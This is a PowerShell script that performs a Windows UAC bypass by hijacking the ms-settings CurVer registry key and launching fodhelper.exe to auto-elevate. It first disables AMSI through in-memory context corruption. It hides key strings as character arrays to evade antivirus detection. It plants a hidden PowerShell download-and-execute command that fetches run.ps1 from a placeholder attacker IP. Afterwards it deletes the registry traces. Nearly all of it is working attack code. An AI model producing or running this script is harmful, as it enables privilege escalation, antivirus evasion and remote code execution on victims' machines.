# UAC Bypass - fodhelper CurVer variant
# Technique : HKCU\Software\Classes\<progid>\Shell\Open\command + ms-settings\CurVer -> fodhelper.exe
# More reliable than the plain DelegateExecute trick on newer Win10/Win11.
# AV Evasion: inline AMSI bypass, char-array string construction, .NET Registry API

# ── AMSI Bypass (inline context corruption) ───────────────────────────────────
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# ── Elevation check ───────────────────────────────────────────────────────────
$id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$wp = New-Object System.Security.Principal.WindowsPrincipal($id)
if ($wp.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) { exit 0 }

# ── Payload ───────────────────────────────────────────────────────────────────
$payload = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -c " +
           "`"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/run.ps1')`""

# ── String construction (char arrays — no static IOC strings) ──────────────────
$s1 = [string]::Join('', [char[]]@(109,115,45,115,101,116))          # "ms-set"
$s2 = [string]::Join('', [char[]]@(116,105,110,103,115))              # "tings"
$msKey = $s1 + $s2                                                    # "ms-settings"
$p1 = [string]::Join('', [char[]]@(46,98,121,112,97,115,115))         # ".bypass"
$progId = $p1
$cur = [string]::Join('', [char[]]@(67,117,114,86,101,114))           # "CurVer"
$f1 = [string]::Join('', [char[]]@(102,111,100,104,101))              # "fodhe"
$f2 = [string]::Join('', [char[]]@(108,112,101,114,46,101,120,101))   # "lper.exe"
$fodBin = $f1 + $f2                                                   # "fodhelper.exe"

# ── Write registry via .NET API ───────────────────────────────────────────────
# 1. Fake ProgID command handler
$progPath = "Software\Classes\" + $progId + "\Shell\Open\command"
$key = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($progPath)
$key.SetValue('', $payload)
$key.Close()

# 2. Point ms-settings\CurVer at the fake ProgID
$curPath = "Software\Classes\" + $msKey + "\" + $cur
$key2 = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($curPath)
$key2.SetValue('', $progId)
$key2.Close()

# ── Trigger auto-elevation ────────────────────────────────────────────────────
$bin = $env:SystemRoot + '\System32\' + $fodBin
Start-Process -FilePath $bin

# ── Cleanup ───────────────────────────────────────────────────────────────────
Start-Sleep -Seconds 3
[Microsoft.Win32.Registry]::CurrentUser.DeleteSubKeyTree("Software\Classes\" + $msKey, $false)
[Microsoft.Win32.Registry]::CurrentUser.DeleteSubKeyTree("Software\Classes\" + $progId, $false)
